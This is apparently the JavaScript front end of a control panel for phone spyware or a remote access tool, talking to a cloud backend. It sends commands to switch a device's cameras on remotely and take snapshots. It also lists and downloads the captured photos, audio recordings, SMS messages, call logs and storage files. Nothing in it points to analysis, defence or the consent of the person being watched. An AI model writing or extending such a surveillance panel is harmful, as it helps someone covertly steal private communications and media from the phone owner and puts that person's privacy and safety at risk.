const API_BASE = "https://sweetdreambackend.onrender.com"; // cloud backend

// ============ Helpers ============
function escapeHtml(unsafe) {
  if (!unsafe) return "";
  return unsafe
    .toString()
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

function formatTimestamp(tsOrName) {
  if (!tsOrName) return "";
  // Try parse filename like snap_172837473.jpg
  if (typeof tsOrName === "string" && tsOrName.startsWith("snap_")) {
    const num = tsOrName.replace(/[^\d]/g, "");
    if (num) return new Date(parseInt(num)).toLocaleString();
  }
  try {
    return new Date(tsOrName).toLocaleString();
  } catch {
    return tsOrName;
  }
}

function openPreview(url, type = "file") {
  const modal = document.createElement("div");
  modal.className = "modal";
  let content = "";
  if (type === "audio") {
    content = `<audio controls src="${url}" style="width:100%"></audio>`;
  } else if (type === "image") {
    content = `<img src="${url}" style="max-width:100%;max-height:80vh;"/>`;
  } else {
    content = `<iframe src="${url}" style="width:100%;height:80vh;"></iframe>`;
  }
  modal.innerHTML = `
    <div class="modal-content">
      <span class="close" onclick="this.parentElement.parentElement.remove()">×</span>
      ${content}
      <div style="margin-top:8px;text-align:right">
        <a href="${url}" download class="download-btn">⬇️ Download</a>
      </div>
    </div>
  `;
  document.body.appendChild(modal);
}

// ============ API Command Helper ============
async function sendCommand(commandType, payload = {}) {
  try {
    const res = await fetch(`${API_BASE}/commands`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ commandType, payload }),
    });
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    const data = await res.json();
    logEvent(`📡 Sent command: ${commandType}`, JSON.stringify(payload));
    return data;
  } catch (err) {
    logEvent(`❌ Failed to send command ${commandType}`, err.message);
  }
}

// ============ Events ============
async function loadEvents() {
  const el = document.getElementById("events");
  try {
    const res = await fetch(`${API_BASE}/events`);
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    const data = await res.json();
    el.innerHTML = `
      <table>
        <tr><th>Type</th><th>Data</th><th>Time</th></tr>
        ${data
          .map(
            e => `<tr>
              <td>${escapeHtml(e.type)}</td>
              <td><pre>${escapeHtml(e.data)}</pre></td>
              <td>${formatTimestamp(e.timestamp)}</td>
            </tr>`
          )
          .join("")}
      </table>`;
  } catch (err) {
    el.innerHTML = `<div class="error">⚠️ Failed to load events: ${err.message}</div>`;
  }
}

function logEvent(type, data) {
  const el = document.getElementById("events");
  el.innerHTML =
    `<div>🔔 ${escapeHtml(type)} - ${escapeHtml(data)}</div>` + el.innerHTML;
}

// ============ Camera ============
document.getElementById("btnCameraFront").onclick = () =>
  sendCommand("camera:start", { lens: "front" });
document.getElementById("btnCameraBack").onclick = () =>
  sendCommand("camera:start", { lens: "back" });
document.getElementById("btnCameraStop").onclick = () =>
  sendCommand("camera:stop");
document.getElementById("btnCameraSnap").onclick = () =>
  sendCommand("camera:snap", { lens: "current" });

// ============ Camera Gallery ============
async function loadCameraGallery() {
  const el = document.getElementById("cameraGallery");
  try {
    const res = await fetch(`${API_BASE}/list/camera`);
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    const files = (await res.json()).sort((a, b) => b.name.localeCompare(a.name));
    el.innerHTML = `
      <table>
        <tr><th>File</th><th>Time</th><th>Action</th></tr>
        ${files
          .map(
            f => `<tr>
              <td>${escapeHtml(f.name)}</td>
              <td>${formatTimestamp(f.name)}</td>
              <td>
                <button onclick="openPreview('${API_BASE}${f.url}', 'image')">👁 Preview</button>
                <a href="${API_BASE}${f.url}" download>⬇️ Download</a>
              </td>
            </tr>`
          )
          .join("")}
      </table>`;
  } catch (err) {
    el.innerHTML = `<div class="error">⚠️ Failed to load camera gallery: ${err.message}</div>`;
  }
}

// ============ Audio Gallery ============
async function loadAudioGallery() {
  const el = document.getElementById("audioGallery");
  try {
    const res = await fetch(`${API_BASE}/list/audio`);
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    const files = (await res.json()).sort((a, b) => b.name.localeCompare(a.name));
    el.innerHTML = `
      <table>
        <tr><th>File</th><th>Time</th><th>Action</th></tr>
        ${files
          .map(
            f => `<tr>
              <td>${escapeHtml(f.name)}</td>
              <td>${formatTimestamp(f.name)}</td>
              <td>
                <button onclick="openPreview('${API_BASE}${f.url}', 'audio')">▶️ Play</button>
                <a href="${API_BASE}${f.url}" download>⬇️ Download</a>
              </td>
            </tr>`
          )
          .join("")}
      </table>`;
  } catch (err) {
    el.innerHTML = `<div class="error">⚠️ Failed to load audio gallery: ${err.message}</div>`;
  }
}

// ============ SMS ============
async function loadSMS() {
  const el = document.getElementById("sms");
  try {
    const res = await fetch(`${API_BASE}/list/sms`);
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    const msgs = await res.json();
    el.innerHTML = `
      <table>
        <tr><th>From</th><th>Message</th><th>Time</th></tr>
        ${msgs
          .map(
            m => `<tr>
              <td>${escapeHtml(m.from)}</td>
              <td>${escapeHtml(m.body)}</td>
              <td>${formatTimestamp(m.timestamp)}</td>
            </tr>`
          )
          .join("")}
      </table>`;
  } catch (err) {
    el.innerHTML = `<div class="error">⚠️ Failed to load SMS: ${err.message}</div>`;
  }
}

// ============ Call Logs ============
async function loadCalls() {
  const el = document.getElementById("calls");
  try {
    const res = await fetch(`${API_BASE}/list/calls`);
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    const calls = await res.json();
    el.innerHTML = `
      <table>
        <tr><th>Number</th><th>Type</th><th>Duration</th><th>Time</th></tr>
        ${calls
          .map(
            c => `<tr>
              <td>${escapeHtml(c.number)}</td>
              <td>${escapeHtml(c.type)}</td>
              <td>${escapeHtml(c.duration)}s</td>
              <td>${formatTimestamp(c.timestamp)}</td>
            </tr>`
          )
          .join("")}
      </table>`;
  } catch (err) {
    el.innerHTML = `<div class="error">⚠️ Failed to load calls: ${err.message}</div>`;
  }
}

// ============ Storage ============
async function loadStorage(path = "/") {
  const el = document.getElementById("storage");
  try {
    const res = await fetch(`${API_BASE}/list/storage?path=${encodeURIComponent(path)}`);
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    const items = await res.json();
    el.innerHTML = `
      <table>
        <tr><th>Name</th><th>Type</th><th>Action</th></tr>
        ${items
          .map(i => {
            if (i.type === "folder") {
              return `<tr>
                <td>📁 ${escapeHtml(i.name)}</td>
                <td>Folder</td>
                <td><button onclick="loadStorage('${i.path}')">📂 Open</button></td>
              </tr>`;
            } else {
              return `<tr>
                <td>${escapeHtml(i.name)}</td>
                <td>File</td>
                <td>
                  <button onclick="openPreview('${API_BASE}${i.url}', 'file')">👁 Preview</button>
                  <a href="${API_BASE}${i.url}" download>⬇️ Download</a>
                </td>
              </tr>`;
            }
          })
          .join("")}
      </table>`;
  } catch (err) {
    el.innerHTML = `<div class="error">⚠️ Failed to load storage: ${err.message}</div>`;
  }
}

// ============ Init ============
window.onload = () => {
  loadEvents();
  loadCameraGallery();
  loadAudioGallery();
  loadSMS();
  loadCalls();
  loadStorage();
};
